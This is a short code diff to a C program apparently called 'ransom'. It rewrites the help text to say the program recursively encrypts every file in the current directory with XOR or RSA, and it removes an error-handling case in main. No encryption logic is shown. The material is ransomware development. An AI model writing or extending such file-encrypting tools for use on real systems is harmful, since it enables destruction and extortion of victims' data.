@@ -15,7 +15,8 @@
 int check_flags(char *args[]){
     if (strcmp(args[1],"--help") == 0){
         printf("Usage: ransom --[OPTION]\n");
-        printf("Be use --help to specifics.\n");
+        printf("This program reads the current directory recursively encrypting every file using choosen algorithm.\n");
+        printf("Be sure to use --help to specifics.\n");
         printf("\n");
         printf("--XOR <key>\n");
         printf("    - Uses a XOR algorithm to cipher files.\n");
@@ -65,10 +66,6 @@ int main(int argc, char *argv[]){
     switch (SIG_RECEIVED) {
         case 0:{
             return 0;
-        }
-        case 1:{
-            printf("An error ocurred\n");
-            return 1;
         }
         case 300:{
             RSA_encrypt();
